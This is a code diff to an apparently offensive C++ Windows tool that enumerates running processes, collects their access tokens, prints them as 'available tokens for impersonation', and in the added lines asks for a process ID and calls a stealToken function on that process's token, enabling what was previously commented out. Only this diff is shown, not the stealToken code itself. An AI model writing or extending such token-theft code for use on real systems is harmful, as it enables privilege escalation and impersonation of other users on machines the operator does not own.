@@ -1,7 +1,7 @@
 ﻿#include "token.h"
 #include <unordered_map>
 #include <list>
-#include <string>
+#include <iostream>
 
 void enumerateProcessess();
 
@@ -36,7 +36,8 @@ int main(int argc, char* argv[])
 		exit(1);
 	}
 
-	std::unordered_map<std::wstring, std::list<TOKEN_INFORMATION>> user_token {};
+	std::unordered_map<std::wstring, std::list<TOKEN_INFORMATION>> username_tokeninfo {};
+	std::unordered_map<int, HANDLE> pid_token {};
 
 	HANDLE hProcess;
 	HANDLE hToken;
@@ -60,13 +61,15 @@ int main(int argc, char* argv[])
 				user = wcscat(user, tInfo.tokenUserInformation.lpName);
 				std::wstring wuser(user);
 
-				if (!user_token.count(wuser))
+				if (!username_tokeninfo.count(wuser))
 				{
-					user_token[wuser] = {};
+					username_tokeninfo[wuser] = {};
 				}
-				std::list tokens = user_token[wuser];
+				std::list tokens = username_tokeninfo[wuser];
 				tokens.insert(tokens.end(), tInfo);
-				user_token[wuser] = tokens;
+				username_tokeninfo[wuser] = tokens;
+
+				pid_token[pe32.th32ProcessID] = hToken;
 			}
 		}
 	} while (Process32Next(hProcessSnap, &pe32));
@@ -74,7 +77,7 @@ int main(int argc, char* argv[])
 
 	int i = 0;
 	wprintf(L"Available tokens for impersonation: \n");
-	for (const auto& kv : user_token)
+	for (const auto& kv : username_tokeninfo)
 	{
 		i++;
 		wprintf(L"[%d] %s\n", i, kv.first.c_str());
@@ -85,7 +88,14 @@ int main(int argc, char* argv[])
 				token.pid, token.tokenStatistics.tokenType, token.tokenStatistics.impersonationLevel, token.tokenElevationType.isElevated, token.tokenElevationType.elevationType, token.tokenIntegrityLevel.integrityLevel);
 		}
 	}
-	//stealToken(hToken);
 
+	int pid;
+	
+	printf("Enter PID to impersonate token from: ");
+	std::cin >> pid;
+	hToken = pid_token[pid];
+
+	stealToken(hToken);
+	
 	return 0;
 }
